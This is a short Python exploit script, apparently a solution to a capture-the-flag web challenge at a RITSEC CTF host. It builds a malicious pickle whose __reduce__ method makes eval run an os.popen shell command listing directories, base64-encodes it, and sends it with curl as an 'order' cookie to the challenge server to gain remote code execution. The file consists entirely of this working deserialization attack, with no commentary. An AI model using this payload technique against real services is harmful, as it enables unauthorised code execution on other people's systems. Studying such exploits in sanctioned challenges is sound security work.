import subprocess
import os
import pickle
import base64


class RCE:
    def __reduce__(self):
        cmd = ("__import__('os').popen('ls ../../').read()")
        return eval, (cmd,)


pickled = pickle.dumps(RCE())
print(base64.urlsafe_b64encode(pickled))

os.system(
    f"curl https://pickles-web.challenges.ctf.ritsec.club/order --cookie \"order=\"{base64.urlsafe_b64encode(pickled).decode()}\"\"")
